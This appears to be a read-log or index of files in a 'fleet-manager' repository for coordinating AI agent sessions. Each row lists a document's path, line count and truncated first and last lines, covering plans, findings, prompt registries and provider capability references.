+READ	control/status.md	83	full	b25	SEAT CLOSED — 2026-07-21T20:35Z	t map:** `docs/roster.md` (historical snapshot after close).
+READ	docs/AGENT_ORIENTATION.md	100	full	b25	# fleet-manager — agent orientation & reading order	```
+READ	docs/CAPABILITIES-verified-2026-07-18.md	91	full	b26	# Agent capabilities — 2026-07-18 (verified)	**no walls.**
+READ	docs/CAPABILITIES.md	1682	full	b26	# fleet-manager — session capabilities & walls	environment.
+READ	docs/NEXT-TASKS.md	96	full	b26	# NEXT-TASKS — the fleet-manager's task set	owner-only residue tracked as `OQ-IDEA-ROUTING-OWNER-ONLY`).
+READ	docs/PROJECT-CLOSEOUT.md	403	full	b26	# fleet-manager — project closeout (fleet master document)	strate/check-exceptions.yml` with a reason, as PR #424 did).
+READ	docs/RESUME.md	116	full	b26	# RESUME — start here, next coordinator	al-docs-plan.md](planning/2026-07-14-central-docs-plan.md)).
+READ	docs/ROUTINES.md	101	full	b26	# fleet-manager — routines & wake-chain doctrine	trigger findings there same session, per its discovery rule.
+READ	docs/SKILLS-local.md	323	full	b26	# fleet-manager — skills: the complete installed set	extra steps; fold it into the doc it should have been.
+READ	docs/SKILLS.md	104	full	b26	# fleet-manager — skill index	ill route via the v3.5 Custom Instructions `skills` entry.)*
+READ	docs/_merge_verification_2026-07-15.md	9	full	b26	# Merge-on-green verification probe (2026-07-15)	e-on-green.yml` REST sweep; it can be deleted once verified.
+READ	docs/ai-project-workflow.md	39	full	b27	# fleet-manager — AI project workflow	Current substrate-workflow adoption: **guided**.
+READ	docs/anthropic-email-pack.md	99	full	b27	# Anthropic email pack — capability self-knowledge (owner dr	nly one (see docs/CAPABILITIES.md, 2026-07-18 append entry).
+READ	docs/architecture.md	41	full	b27	# fleet-manager — architecture	```
+READ	docs/audits/eap-project-audit-2026-07-14.md	215	full	b27	# EAP close-out project audit — fleet-manager seat (2026-07-	 wake action, out of this audit's scope and left flagged). |
+READ	docs/capabilities.md	9	full	b27	# Fleet capability manifest — MOVED (pointer stub)	> content here.
+READ	docs/central-docs-plan.md	10	full	b27	# Fleet docs centralization plan — MOVED (pointer stub)	> pointer-rot guard, §6). Read and cite the planning copy.
+READ	docs/collaboration-model.md	85	full	b27	# fleet-manager — collaboration model	iving and updated the day a lesson lands or an ask resolves.
+READ	docs/conventions/adversarial-review.md	479	full	b27	# The review ladder — provenance, not correctness	  errors in three days of use is the entire sample.
+READ	docs/conventions/outbox-rollover.md	58	full	b27	# Outbox rollover — the append-only control-file archival co	rule, never the roll).
+READ	docs/conventions/owner-drive-folder.md	53	full	b27	# The owner's public Drive folder — reading it without the D	nything placed in it is disclosed to anyone holding the URL.
+READ	docs/conventions/reading-screen-recordings.md	125	full	b27	# Reading a screen recording	**Audio untested** — both clips were silent screen captures.
+READ	docs/conventions/reading-shared-ai-chats.md	158	full	b27	# Reading a shared AI chat transcript	summaries create. Reading one is now a two-minute operation.
+READ	docs/conventions/vertex-first-for-gemini.md	228	full	b27	# Default to Vertex for all Gemini work	rather than silently reverting to the card.
+READ	docs/current-state.md	598	full	b27	# fleet-manager — Current State	f it persists, hand it to the hub chat, not the owner-queue.
+READ	docs/decisions.md	194	full	b27	# fleet-manager — decisions	  and propagated here by the independent fm #835 review.
+READ	docs/dispatch-log.md	671	full	b28	# Dispatch log	elivered night ORDER + answers the seat's 22:29Z outbox ask)
+READ	docs/eap-audit-collection.md	102	full	b28	# EAP audit collection — fleet fan-out tracker (2026-07-14)	ignal — a PR opens minutes before its doc content is pushed.
+READ	docs/eap-final-email-draft-2026-07-14.md	77	full	b28	# EAP final feedback email — owner draft (2026-07-14)	pective.md` §3 and `docs/eap-audit-collection.md` @ b01c14f.
+READ	docs/eap-final-night-worklists-2026-07-13.md	252	full	b28	# EAP final-night worklists — 2026-07-13	t `docs/eap/anthropic-email-3-draft-2026-07-13.md@f969b95`).
+READ	docs/eap-final-recon-2026-07-14.md	116	full	b28	# EAP final-day recon + closeout fan-out record (2026-07-14)	the cross-fleet dedup surface.
+READ	docs/eap-owner-checklist-2026-07-14.md	76	full	b28	# EAP owner checklist — one sitting (2026-07-14)	 HEADs at measurement, normal for minutes-old merge commits.
+READ	docs/eap-retrospective.md	427	full	b28	# EAP retrospective — likes, dislikes, wishlist	  validated improvements.
+READ	docs/eap-story.md	580	full	b29	# The EAP story	  guessed.
+READ	docs/evidence-index.md	143	full	b29	# Cross-repo evidence index — GENERATED	db5f133f6f4a41cf/docs/fleet-inconsistencies-2026-07-13.md) |
+READ	docs/execution-surfaces.md	303	full	b29	# Execution surfaces — what each one can do	d help or hurt. Both are cheap to test and neither has been.
+READ	docs/experiments/README.md	53	full	b29	# Experiments — pre-registered protocols + judge records	     card's self-report is checked.
+READ	docs/experiments/harness-x-model-2026-07-09.md	196	full	b29	# Harness × model experiment — protocol (pre-registered 2026	 standing rule: [`README.md`](README.md) § Standing caveats.
+READ	docs/experiments/prompts/pair-fable.md	379	full	b29	# PAIR-FABLE — harness-comparison package (gba-play)	    added to the launch checklist and §2.
+READ	docs/experiments/prompts/pair-opus.md	352	full	b29	# PAIR-OPUS — design-system kit generator (Opus 4.8)	three pairs), alongside the existing blind aesthetic rating.
+READ	docs/experiments/prompts/pair-sonnet.md	344	full	b29	# PAIR-SONNET — devlog generator (Sonnet 5)	ixed in passing: a stray trailing code fence at end of file.
+READ	docs/experiments/tools/wcag-contrast-check.py	27	full	b29	#!/usr/bin/env python3	    print(f"{contrast(sys.argv[1], sys.argv[2]):.4f}")
+READ	docs/fence-index.md	70	full	b29	# Fleet fence-exposure index — which repos expose which seat	`python3 docs/prompts/v3/tools/seat_digest_sync.py --check`
+READ	docs/findings/2026-07-22-pat-and-automode-capabilities.md	129	full	b29	# Findings — verified GitHub capability matrix + access-path	```
+READ	docs/findings/2026-08-04-generated-art-pipeline.md	328	full	b29	# How spider-swing's generated art got consistent — and why 	emini or Grok Imagine would settle it and has not been done.
+READ	docs/findings/2026-08-05-foundation-continuation.md	260	full	b30	# The foundation, the false-negative gap, and the next order	  session might legitimately want.
+READ	docs/findings/2026-08-05-gemini-delegation.md	146	full	b30	# Delegating read-heavy work to Gemini — measured 2026-08-05	is private and stays out unless the owner decides otherwise.
+READ	docs/findings/2026-08-05-gemini-url-accuracy-benchmark.md	177	full	b30	# Gemini accuracy benchmark — when it cannot read the page, 	 URLs, one model, one day, and it warrants no broader claim.
+READ	docs/findings/2026-08-05-google-play-submission-requirements.md	307	full	b30	# Google Play submission requirements — verified for Swingy 	[`../owner-queue.md`](../owner-queue.md).
+READ	docs/findings/2026-08-05-handoff-fidelity-and-boot-path.md	175	full	b30	# A handoff that carried eight asks and narrowed the ninth	xists in the sibling repos' local skill copies is unchecked.
+READ	docs/findings/2026-08-05-hud-telemetry-verification.md	103	full	b30	# Verifying generated and captured video with the game's own	llision-free windows for trailer cutting — is **not built**.
+READ	docs/findings/2026-08-05-owner-calibration-three-sessions.md	140	full	b30	# Owner calibration — three sessions, counted independently	  rule about owners in general.
+READ	docs/findings/2026-08-05-playtest-discord-and-superbot-value.md	299	full	b30	# A playtest Discord for Slingy Spider — what it needs, and 	It is Discord's own line: *one developer reply per day.*
+READ	docs/findings/2026-08-05-superbot-next-live-audit.md	446	full	b30	# superbot-next — what booting it measured, and why the harn	  database.
+READ	docs/findings/2026-08-05-three-repo-state-audit.md	402	full	b30	# What is true across fleet-manager, superbot and superbot-n	  to finish. The call is the owner's.
+READ	docs/findings/2026-08-06-checker-classification.md	219	full	b30	# The kit's checkers, classified — and what the gate output 	 superbot-next code was read.** Out of scope by the handoff.
+READ	docs/findings/2026-08-06-provenance-mechanism-measured.md	430	full	b30	# The provenance mechanism, measured — framing is the load-b	  establishes what happens in week two.
+READ	docs/findings/2026-08-07-curious-research-handover.md	168	full	b30	# curious-research is now a gift being handed to its reader 	   route rather than a dead end.
+READ	docs/findings/2026-08-07-what-the-substrate-caught.md	140	full	b30	# What the substrate caught, and what only the owner could —	  repeatedly, and the record shows **zero false positives**.
+READ	docs/findings/2026-08-08-why-rules-dont-bind.md	205	full	b31	# Why the rules don't bind — one session's errors, counted a	  the gate still catches the violation — later, as before).
+READ	docs/findings/2026-08-09-eap-correspondence-record.md	220	full	b31	# The EAP correspondence — what was sent, what came back, an	an § 2 lists as unused material. That repo was not attached.
+READ	docs/findings/2026-08-09-error-to-mechanism.md	341	full	b31	# Thirteen errors, scored against "could a machine have caug	correction would have been ignored inside one session.
+READ	docs/findings/2026-08-09-independent-guard-review.md	192	full	b31	# Independent review of fm #833 and #834	ubstrate-kit v1.21.0 remains a separate owner-gated session.
+READ	docs/findings/2026-08-09-intent-map-replay.md	190	full	b31	# The intent map, walked through ten owner asks as the recor	 reviewing the plan's author would have found nothing wrong.
+READ	docs/findings/2026-08-09-substrate-kit-defects.md	202	full	b31	# Defects in substrate-kit v1.20.2 — the v1.21.0 session's w	617`), not the tree, so `.sessions/` is outside it entirely.
+READ	docs/findings/2026-08-10-fleet-manager-cold-read.md	135	full	b31	# fleet-manager's cold front door — failure, repair, and pro	  recorded as `OQ-KIT-V1-21-RELEASE` and untouched here.
+READ	docs/findings/2026-08-10-fm835-verification.md	141	full	b31	# Third-party verification of fm #835	write counts down. Where one is genuinely needed, derive it.
+READ	docs/findings/README.md	38	full	b31	# Findings — committed worker-research record	ointer as an owner decision, and advances D2 to shiftlife. |
+READ	docs/findings/branch-recreation-census-2026-07-14.md	106	full	b31	# Branch-recreation census — four-repo read-only sweep (2026	2026-07-14; census coordinator-run, spot-checks per Q-0120.
+READ	docs/findings/ci-tier-sim-2026-07-09.md	220	full	b31	# CI-tier simulation — findings (2026-07-09)	treat the 5–7 min Code Quality wall as the next cost target.
+READ	docs/findings/enabler-install-verification-2026-07-11.md	100	full	b31	# Auto-merge landing preconditions — per-lane verification (	accordingly parks READY+green awaiting a non-author landing.
+READ	docs/findings/fable5-review-2026-07-09.md	192	full	b31	# Fable-5 fleet review — 2026-07-09/10 (ultracode corpus rev	packages cite the same numbers.*
+READ	docs/findings/fleet-economics-2026-07.md	106	full	b31	# Fleet economics ledger — 2026-07 (EAP pre-close snapshot)	allocation key.
+READ	docs/findings/gba-toolchain-proof-2026-07-09.md	78	full	b31	# GBA toolchain proof — both game-lab tracks verified in-con	  [`../owner-queue.md`](../owner-queue.md) launch item).
+READ	docs/findings/gpt-5-6-report-2026-07-09.md	124	full	b31	# GPT-5.6 research report (2026-07-09)	changes needed.
+READ	docs/findings/instruction-and-env-audit-2026-07-11.md	293	full	b32	# Fleet instruction + environment audit — 2026-07-11	 a `file:line` citation above — re-verify before re-issuing.
+READ	docs/findings/manifest-parallel-run-2026-07-11.md	69	full	b32	# Parallel-run: fm roster gen #4 vs superbot fleet-manifest 	" sentence is now false everywhere (all self-arms executed).
+READ	docs/findings/merge-on-green-rollout-verification-2026-07-15.md	135	full	b32	# Merge-on-green rollout verification — 19-repo sweep (2026-	dispatching session; this doc is the committed distillation.
+READ	docs/findings/model-matrix-2026-07.md	77	full	b32	# Fleet model matrix — 2026-07 (ORDER 010)	their model line should adopt family-level names per Q-0262.
+READ	docs/findings/night-review-2026-07-10.md	1597	full	b32	# Night review — the gen-2 fleet's first fully-autonomous ni	17, Q19, and Q20/Q21 (kit state at `21d3ead`) are untouched.
+READ	docs/findings/permission-rules-port-2026-07-11.md	50	full	b32	# Agent-permission port — `.claude/settings.json` (2026-07-1	self-merge).
+READ	docs/findings/ping-test-2026-07-09.md	155	full	b32	# Fleet PING test — dispatch table + write latency (2026-07-	rge-on-green grant in the gen-2 seed exist for exactly this.
+READ	docs/findings/retro-synthesis-2026-07-09.md	833	full	b33	# Fleet retro synthesis — all 10 lanes (2026-07-09)	is the gen-2 blueprint (`docs/gen2-blueprint.md`).
+READ	docs/findings/ui-visibility-2026-07-09.md	72	full	b33	# claude.ai fleet-visibility findings — two screen recording	   remain the only reliable needs-owner surface.
+READ	docs/findings/ultracode-verification-2026-07-10.md	206	full	b33	# Ultracode verification — tonight's three ultracode-class o	  variable substitution before the next verification wave.
+READ	docs/findings/venture-shortlist-2026-07-09.md	124	full	b33	# Venture shortlist — monetization-video analysis (2026-07-0	(commodity, distribution-dependent, licensing friction).
+READ	docs/fleet-account-2026-07-26.md	314	full	b33	# The fleet, as the record tells it — 2026-07-26	   doesn't know and should?
+READ	docs/fleet-inconsistencies-2026-07-13.md	302	full	b33	# Fleet inconsistency ledger	  reader can distinguish dedup from drop.
+READ	docs/fleet-triage.md	1823	full	b34	# Fleet triage register — keep / replace / archive / delete	 `control/status.md`; results recorded there per the closer.
+READ	docs/gen2-blueprint.md	513	full	b34	# Gen-2 blueprint — Phase-2 (born-right) Project seed standa	   Status flipped `plan` → `binding` (changelog at top).
+READ	docs/handoff-2026-07-09.md	167	full	b34	# Handoff — manager succession, 2026-07-09 (evening)	n [`findings/`](findings/README.md) and this handoff itself.
+READ	docs/handoff-2026-07-10.md	121	full	b35	# Handoff — manager succession, 2026-07-10 (afternoon)	  handoff itself.
+READ	docs/helper-policy.md	27	full	b35	# fleet-manager — helper policy	first, with one line on what belongs in each.)
+READ	docs/idea-routing-2026-07-18.md	59	full	b35	# Idea routing — 2026-07-18 (verified)	lane builds on it.
+READ	docs/ideas/README.md	120	full	b35	# fleet-manager — idea backlog & lifecycle	  `captured` · quick-win candidate (weekly brief routine)
+READ	docs/ideas/archive-ready-retro-gap-advisory-2026-07-11.md	40	full	b35	---	orders.
+READ	docs/ideas/bot-analytics-lane-2026-07-09.md	22	full	b35	---	**Status:** captured (not approved)
+READ	docs/ideas/checker-contract-bank-2026-08-09.md	56	full	b35	---	, not approved; do not fold it into the v1.20.2 adopter fix.
+READ	docs/ideas/derive-dont-state-counts-2026-08-10.md	56	full	b35	---	is something else.
+READ	docs/ideas/design-system-lane-2026-07-09.md	22	full	b35	---	**Status:** captured (not approved)
+READ	docs/ideas/devlog-building-in-public-2026-07-09.md	23	full	b35	---	**Status:** captured (not approved)
+READ	docs/ideas/email-chief-of-staff-2026-07-09.md	22	full	b35	---	**Status:** captured (not approved)
+READ	docs/ideas/fleet-economics-ledger-2026-07-10.md	41	full	b35	---	**Status:** captured (not approved).
+READ	docs/ideas/fleet-security-auditor-2026-07-09.md	22	full	b35	---	**Status:** captured (not approved)
+READ	docs/ideas/game-lab-2026-07-09.md	34	full	b35	---	[`../owner-queue.md`](../owner-queue.md).
+READ	docs/ideas/gba-play-discord-2026-07-10.md	51	full	b35	---	 gba-homebrew's committed ROMs with zero new toolchain work.
+READ	docs/ideas/lane-seeder-automation-2026-07-10.md	41	full	b35	---	-kit's backlog (kit-lab never writes consumer repos — KF-2).
+READ	docs/ideas/mobile-lab-lane-2026-07-09.md	23	full	b35	---	**Status:** captured (not approved)
+READ	docs/ideas/research-desk-release-watcher-2026-07-09.md	24	full	b35	---	**Status:** captured (not approved)
+READ	docs/ideas/review-queue-drainer-2026-07-10.md	46	full	b35	---	traffic, not on this historical absence.
+READ	docs/ideas/spend-instrument-model-2026-07-09.md	24	full	b35	---	**Status:** captured (not approved)
+READ	docs/ideas/superbot-production-watchdog-2026-07-09.md	22	full	b35	---	**Status:** captured (not approved)
+READ	docs/intent.md	235	full	b35	# fleet-manager — intent	se 3's review ladder starts at intent fidelity, not at code.
+READ	docs/launch-readiness-2026-07-10.md	699	full	b35	# Launch readiness — Q-0261 finalize-first relaunch (2026-07	unding package (they are branch-only until then — caveat 1).
+READ	docs/merge-queue-2026-07-09.md	46	full	b35	# Merge queue — 2026-07-09 (verified at live HEAD, 22:41Z)	integrity, mining's explicit owner-gate) and stay valid.
+READ	docs/owner-actions-2026-07-17.md	173	full	b35	# Owner actions — fleet-wide, 2026-07-17	 item if acting more than a few hours after this timestamp.*
+READ	docs/owner-profile.md	107	full	b35	# fleet-manager — owner working profile	fleet-manager. When in doubt, leave it out.
+READ	docs/owner-queue-candidates.md	163	full	b36	# Owner-queue candidate feed — GENERATED	r; silent stranding is the failure this feed exists to kill.
+READ	docs/owner-queue.md	1183	full	b36	# Owner queue	dated (campaign closed with gen-1; email pack parked above).
+READ	docs/owner-reflection-2026-07-21.md	256	full	b36	# Owner reflection — autonomy, the verification wall, and th	  power he can't review is negative value.
+READ	docs/owner-steps-2026-07-18.md	231	full	b36	# Owner steps — fleet-wide, 2026-07-18	- Stale **baton triggers** (already absent).
+READ	docs/ownership.md	25	full	b36	# fleet-manager — ownership	oes into docs/owner-queue.md, never a new scattered surface.
+READ	docs/planning/2026-07-12-repo-consolidation-plan.md	387	full	b36	# Repo consolidation plan — 2026-07-12 (phase B, owner-facin	 P1-1/P1-3 + E#44; B#41 on P1-4 + E#45; B#42 on P1-5 + E#46.
+READ	docs/planning/2026-07-14-central-docs-plan.md	389	full	b37	# Fleet docs centralization plan	uld be read from fm `docs/owner-queue.md` at execution time.
+READ	docs/planning/2026-07-19-next-slices.md	230	full	b37	# Next executable slices — night-shift idea groom (2026-07-1	3. I8-reads-lane-fence (definite-keeper remedy)
+READ	docs/planning/2026-07-24-app-plan-life-admin.md	347	full	b37	# App plan — the Life Admin platform, first app: **ShiftLife	  encodes that instruction as standing product law.
+READ	docs/planning/2026-07-26-ci-consolidation.md	160	full	b37	# CI consolidation — 2026-07-26	 makes roughly two-thirds of the CI cleanup happen for free.
+READ	docs/planning/2026-07-26-consolidation-plan-v2.md	233	full	b37	# Fleet plan v2 — verification-led consolidation	  testing are done.
+READ	docs/planning/2026-07-26-consolidation-program.md	187	full	b37	# The consolidation program — the working plan	ns owner-reserved; **D2 advances to shiftlife**. | fm #837 |
+READ	docs/planning/2026-07-26-final-eap-email-plan.md	178	full	b37	# The final EAP email — plan for the writing session	thout the owner — he sends it himself, from his own compose.
+READ	docs/planning/2026-07-26-fleet-consolidation-plan.md	282	full	b37	# Fleet consolidation plan — 2026-07-26 (product topology) ·	 URL. Default is to leave it in place and archive around it.
+READ	docs/planning/2026-08-08-agent-operating-environment-roadmap.md	553	full	b38	# The agent operating environment — the three-phase roadmap	e specific drift to watch for when the first one is written.
+READ	docs/planning/2026-08-08-fleet-manager-as-index.md	221	full	b38	# fleet-manager as the index — the two-layer restructure	something was deferred rather than silently omitting it.
+READ	docs/planning/README.md	38	full	b38	# Planning — plans and launch records	 2026-07-11 fleet review; seeded fm's fleet-triage register.
+READ	docs/planning/gen2-launch-record-2026-07-10.md	106	full	b38	# Gen-2 launch record — overnight 2026-07-09/10	   complete; harness experiment not launched.
+READ	docs/planning/idea-backlog.md	61	full	b38	# Session-card idea backlog — GENERATED	stry drift checker | groomed → `2026-07-19-next-slices.md` |
+READ	docs/planning/order-016-followups-2026-07-11.md	114	full	b38	# ORDER 016 follow-ups — draft ORDERs (2026-07-11)	knob vs escape-hatch stays) in `environments/archetypes.md`.
+READ	docs/planning/overnight-menu-2026-07-17.md	251	full	b38	# Overnight Planning Menu — 2026-07-17	 S5, S9** (pure drift/staleness catchers, ✅, zero coupling).
+READ	docs/playbook.md	388	full	b38	# Fleet manager playbook	    (2026-07-10)
+READ	docs/pr-landing-audit-2026-07-16.md	131	full	b38	# Fleet-wide PR-Landing Audit — 2026-07-16	t exhaustively — no exceptions found. No rate-limiting hit._
+READ	docs/pre-reboot-review-2026-07-15.md	101	full	b38	# Pre-reboot fleet review — 2026-07-15	trol tree), product-forge + codetool-lab ×3 (archive-class).
+READ	docs/project-recreation-runbook.md	86	full	b38	# Project Recreation Runbook — EAP Wind-Down Cutover	by the owner and each seat's coordinator, not by this seat.*
+READ	docs/prompts/2026-08-07-curious-research-external-review.md	145	full	b38	# External review of `curious-research` — the paste-ready pr	measurement neither one alone can give you.
+READ	docs/prompts/README.md	82	full	b38	# Deployed prompts — verbatim ledger	2026-07-09.md`](../findings/retro-synthesis-2026-07-09.md)).
+READ	docs/prompts/baseline-2026-07-11/game-lab.md	29	full	b38	> **Status:** `reference`	utine name + cadence you'll arm + the worker-retry fallback.
+READ	docs/prompts/baseline-2026-07-11/websites.md	27	full	b38	> **Status:** `reference`	utine name + cadence you'll arm + the worker-retry fallback.
+READ	docs/prompts/chatgpt-project-instructions.md	137	full	b38	# ChatGPT project instructions — "Fleet Manager"	T`; `docs/execution-surfaces.md` § 4b carries the reasoning.
+READ	docs/prompts/codetool-arms.md	36	full	b38	# codetool arms — Custom Instructions + startup prompt (iden	```
+READ	docs/prompts/external-campaign-metaprompt.md	47	full	b38	# external-campaign-metaprompt — ChatGPT prompt-creation met	07-09.md`](../handoff-2026-07-09.md) — in-flight at handoff.
+READ	docs/prompts/external-review-opus-2026-07-09.md	27	full	b38	# External review prompt — doctrine comparison (Opus), 2026-	```
+READ	docs/prompts/external-review-sonnet-2026-07-09.md	27	full	b38	# External review prompt — wind-down claims audit (Sonnet), 	```
+READ	docs/prompts/external/2026-07-12-gpt-deep-research-prompt.md	146	full	b39	# External deep-research prompt — autonomous agent-fleet aud	*End of prompt. — fleet-manager, 2026-07-12.*
+READ	docs/prompts/game-exploration.md	27	full	b39	# game-exploration — Custom Instructions + startup prompt	```
+READ	docs/prompts/game-lab-founding.md	171	full	b39	# game-lab — gen-2 founding instruction (FINALIZED, not yet 	  [`README.md`](README.md).
+READ	docs/prompts/game-mining.md	27	full	b39	# game-mining — Custom Instructions + startup prompt	```
+READ	docs/prompts/gen1-winddown-universal.md	115	full	b39	# gen1-winddown-universal — the gen-1 → gen-2 wind-down prom	  deliverable 4, environment from deliverable 5).
+READ	docs/prompts/init-prompt-universal.md	70	full	b39	# init-prompt-universal — per-project fleet-protocol init pr	```
+READ	docs/prompts/trading-lab.md	26	full	b39	# trading-lab — Custom Instructions + startup prompt	```
+READ	docs/prompts/universal-wakeup.md	26	full	b39	# universal-wakeup — self-review / wake-up prompt (all 10 la	```
+READ	docs/prompts/v3/CHANGES-v3.4-to-v3.5.md	51	full	b39	# What changed in your seat prompts: v3.4 → v3.5 → v3.6 (one	ker green: `python3 docs/prompts/v3/tools/regen_b_files.py`.
+READ	docs/prompts/v3/README.md	120	full	b39	# v3 prompt registry — paste-ready starting prompts per seat	 (per-seat stamps bumped by one); `--check-registry` exit 0.
+READ	docs/prompts/v3/custom-instructions-core.md	106	full	b39	> **Status:** `reference`	"per-section", "per-repo: gba per-section · pml wholesale").
+READ	docs/prompts/v3/final-closer.md	26	full	b39	> **Status:** `reference`	e session should do first. Then end. Do not re-arm anything.
+READ	docs/prompts/v3/per-project/README.md	869	full	b39	> **Status:** `reference`	d already durably recorded in kit control/status.md ⚑ 14/15.
+READ	docs/prompts/v3/per-project/curious-research-custom-instructions.md	47	full	b39	> **Status:** `reference`	-15 · fm ORDER 048 · UNIVERSAL v5 · seat facts @ 2026-07-13.
+READ	docs/prompts/v3/per-project/curious-research-startup.md	146	full	b40	> **Status:** `reference`	e; routine name + cadence + worker-retry + verify-after-arm.
+READ	docs/prompts/v3/per-project/fleet-manager-custom-instructions.md	48	full	b40	> **Status:** `reference`	-15 · fm ORDER 048 · UNIVERSAL v5 · seat facts @ 2026-07-15.
+READ	docs/prompts/v3/per-project/fleet-manager-startup.md	166	full	b40	> **Status:** `reference`	e; routine name + cadence + worker-retry + verify-after-arm.
+READ	docs/prompts/v3/per-project/game-lab-custom-instructions.md	48	full	b40	> **Status:** `reference`	-15 · fm ORDER 048 · UNIVERSAL v5 · seat facts @ 2026-07-12.
+READ	docs/prompts/v3/per-project/game-lab-startup.md	146	full	b40	> **Status:** `reference`	e; routine name + cadence + worker-retry + verify-after-arm.
+READ	docs/prompts/v3/per-project/ideas-lab-custom-instructions.md	47	full	b40	> **Status:** `reference`	-15 · fm ORDER 048 · UNIVERSAL v5 · seat facts @ 2026-07-12.
+READ	docs/prompts/v3/per-project/ideas-lab-startup.md	148	full	b40	> **Status:** `reference`	e; routine name + cadence + worker-retry + verify-after-arm.
+READ	docs/prompts/v3/per-project/self-improvement-custom-instructions.md	48	full	b40	> **Status:** `reference`	-15 · fm ORDER 048 · UNIVERSAL v5 · seat facts @ 2026-07-15.
+READ	docs/prompts/v3/per-project/self-improvement-startup.md	146	full	b41	> **Status:** `reference`	e; routine name + cadence + worker-retry + verify-after-arm.
+READ	docs/prompts/v3/per-project/superbot-custom-instructions.md	47	full	b41	> **Status:** `reference`	-15 · fm ORDER 048 · UNIVERSAL v5 · seat facts @ 2026-07-15.
+READ	docs/prompts/v3/per-project/superbot-startup.md	147	full	b41	> **Status:** `reference`	e; routine name + cadence + worker-retry + verify-after-arm.
+READ	docs/prompts/v3/per-project/superbot-world-custom-instructions.md	48	full	b41	> **Status:** `reference`	-15 · fm ORDER 048 · UNIVERSAL v5 · seat facts @ 2026-07-14.
+READ	docs/prompts/v3/per-project/superbot-world-startup.md	146	full	b41	> **Status:** `reference`	e; routine name + cadence + worker-retry + verify-after-arm.
+READ	docs/prompts/v3/per-project/venture-lab-custom-instructions.md	47	full	b41	> **Status:** `reference`	-15 · fm ORDER 048 · UNIVERSAL v5 · seat facts @ 2026-07-12.
+READ	docs/prompts/v3/per-project/venture-lab-startup.md	146	full	b41	> **Status:** `reference`	e; routine name + cadence + worker-retry + verify-after-arm.
+READ	docs/prompts/v3/per-project/websites-custom-instructions.md	48	full	b41	> **Status:** `reference`	-15 · fm ORDER 048 · UNIVERSAL v5 · seat facts @ 2026-07-15.
+READ	docs/prompts/v3/per-project/websites-startup.md	147	full	b42	> **Status:** `reference`	e; routine name + cadence + worker-retry + verify-after-arm.
+READ	docs/prompts/v3/planned-routes.md	61	full	b42	# prompts v3.3 — planned routes (keywords/expansions with no	  carries the dead-pointer warning rather than the route.
+READ	docs/prompts/v3/session-ender.md	17	full	b42	> **Status:** `reference`	hy), and that the chain closed with zero new routines armed.
+READ	docs/prompts/v3/tools/regen_b_files.py	497	full	b42	#!/usr/bin/env python3	    sys.exit(main(sys.argv[1:]))
+READ	docs/prompts/v3/tools/seat_digest_sync.py	629	full	b42	#!/usr/bin/env python3	    sys.exit(main(sys.argv[1:]))
+READ	docs/prompts/v3/universal-continue.md	19	full	b42	> **Status:** `reference`	't add it to the owner list, and don't stop the run over it.
+READ	docs/prompts/v3/universal-startup.md	38	full	b42	> **Status:** `reference`	me + cadence + worker-retry + verify-after-arm. Then BOOT 1.
+READ	docs/prompts/venture-lab-draft.md	128	full	b42	# venture-lab — gen-2 founding instruction (FINALIZED, not y	  [`README.md`](README.md).
+READ	docs/proposals/2026-07-12-consolidation-and-reset-plan.md	341	full	b42	# Fleet consolidation + seat reset plan — 2026-07-12	seat on owner order, 2026-07-12.*
+READ	docs/proposals/README.md	14	full	b42	# Proposals — owner-decision documents	026-07-10.md) | Conformed copy of the mapping after review |
+READ	docs/proposals/games-program-mapping-2026-07-10.md	189	full	b42	# Games-program mapping proposal (Q-0259 r.5 · ORDER 012)	s document. Everything else here is paper; nothing executes.
+READ	docs/proposals/games-program-mapping-conformed-2026-07-10.md	168	full	b42	# Games-program mapping — CONFORMED (Q-0267 owner-shaped · O	  owner's clicks (Seat B repo creation + paste wave).
+READ	docs/proposals/generated-roster-from-heartbeats.md	91	full	b42	# Proposal — generated fleet roster from lane heartbeats	`docs/owner-queue.md` deliberately NOT touched.
+READ	docs/proposals/instructions/README.md	61	full	b42	# Gen-2 founding instruction packages — 2 DEPLOYED (fitted),	freely; nothing here self-deploys.
+READ	docs/proposals/instructions/codetool-arm-template.md	325	full	b43	# Gen-2 PROPOSED founding package — codetool-arm-template (o	 for future parallelism but carries no per-session ceremony.
+READ	docs/proposals/instructions/game-lab.md	274	full	b43	# Gen-2 PROPOSED founding package — game-lab (two-track GBA 	their absence is visibly deliberate, not an omission.
+READ	docs/proposals/instructions/games-exploration.md	239	full	b43	# Gen-2 PROPOSED founding package — games-exploration (super	visibly deliberate, not an omission.
+READ	docs/proposals/instructions/games-mining.md	289	full	b43	# Gen-2 PROPOSED founding package — games-mining (superbot-g	deliberate, not an omission.
+READ	docs/proposals/instructions/mobile-lab.md	395	full	b43	# mobile-lab — gen-2 PROPOSED founding package	eparate purchase-requests.md rows, each your explicit click.
+READ	docs/proposals/instructions/substrate-kit.md	277	full	b43	# Gen-2 PROPOSED founding package — substrate-kit (kit-lab)	   honored).
+READ	docs/proposals/instructions/superbot-next.md	310	full	b43	# superbot-next — gen-2 PROPOSED founding package	eviction · band-7 key envelope (owner-queue item 10 family).
+READ	docs/proposals/instructions/trading-strategy.md	474	full	b43	# trading-strategy — gen-2 PROPOSED founding package	```
+READ	docs/proposals/instructions/venture-lab.md	366	full	b43	# venture-lab — gen-2 PROPOSED founding package	   ORDER 001."
+READ	docs/proposals/instructions/websites.md	468	full	b44	# Gen-2 PROPOSED founding package — websites	```
+READ	docs/proposals/universal-v5-hoist-bundle-2026-07-11.md	80	full	b44	# UNIVERSAL v4 → v5 owner paste bundle — §3.3 hoist + incide	per-file copies stay correct until then).
+READ	docs/providers/README.md	90	full	b44	# Provider capability references	   marking what came from where.
+READ	docs/providers/chatgpt.md	237	full	b44	# ChatGPT — provider capability reference	conversation, skip the browser.
+READ	docs/providers/claude.md	222	full	b44	# Claude — provider capability reference	ing past the 14-day staleness window before depending on it.
+READ	docs/providers/cohere.md	72	full	b44	# Cohere — provider capability reference	- Nothing here is measured in this estate yet.
+READ	docs/providers/deepseek.md	99	full	b44	# DeepSeek — provider capability reference	- Nothing here is measured in this estate yet.
+READ	docs/providers/gemini.md	510	full	b44	# Gemini — provider capability reference	changed after training and nothing said so.
+READ	docs/providers/github-copilot.md	145	full	b44	# GitHub Copilot — provider capability reference	  vendor-doc-sourced, none verified by a run.
+READ	docs/providers/grok.md	146	full	b44	# Grok (xAI) — provider capability reference	- Nothing here is measured in this estate yet.
+READ	docs/providers/meta-llama.md	112	full	b44	# Meta (Llama / Muse) — provider capability reference	- Nothing here is measured in this estate yet.
